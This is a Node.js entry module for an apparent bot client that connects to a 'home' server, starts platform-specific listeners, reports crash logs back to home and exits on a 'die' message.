'use strict';

const HomeUpdateListener = require('./homeUpdateListener');
const BotListener = require('./botListener');
let os = require('os');
let net = require('net');
let HomeCon = require('./homeCon');
let Utils = require('./utils');
let config = require('./config');
let fs = require('fs');

process.on('uncaughtException', (err) => {
  let str = new Error().stack.toString();
  str += ' \r\n ';
  str += err.toString() + ' \r\n ';
  str += err.stack.toString();
  str += '\n\r---------------------------------\n\r';
  console.log(str);
  HomeCon.sendDebugMsg({
    msg: str,
    err: err,
    from: 'index'
  });
  Utils.logToFile(str, config.errFile);
  process.exit(0);
});

process.on('exit', (err) => {
  let str = new Error().stack.toString();
  str += ' \r\n ';
  str += err.toString() + ' \r\n ';
  if (err.stack) {
    str += err.stack.toString();
  }
  str += '\n\r---------------------------------\n\r';
  console.log(str);
  HomeCon.sendDebugMsg({
    msg: str,
    err: err,
    from: 'index'
  });
  Utils.logToFile(str, config.errFile);
  process.exit(0);
});

process.on('message', (m) => {
  console.log('CHILD got message:', m);
  if (m.type === 'die') {
    HomeCon.sendMsg({
      type: 'dying'
    });
    process.exit(0);
  }
});




function main(homeIp, homePort, id) {
  console.log('started');

  if (!homeIp || !homePort || !id) {
    console.log('invalid args: %s %s %s', homeIp, homePort, id);
    return;
  }

  console.log('home address is: %s:%s', homeIp, homePort);

  if (process.platform === 'linux') {
    BotListener.init();
  } else if (process.platform.indexOf('win') !== -1) {
    // is windows
    HomeUpdateListener.init();
    
  }

  HomeCon.connect(homeIp, homePort, (err) => {
    if (err) {
      console.log('could not connect');
      console.log(err);
      return;
    }
    err = '';
    try {
      err = fs.readFileSync(config.errFile).toString();
      fs.unlinkSync(config.errFile);
    } catch (e) {

    }
    
    if (err) {
      HomeCon.sendDebugMsg({
	err: err,
	length: err.length
      });
    } else {

    }
    
    console.log('connected to home');
  });
}

module.exports = main;
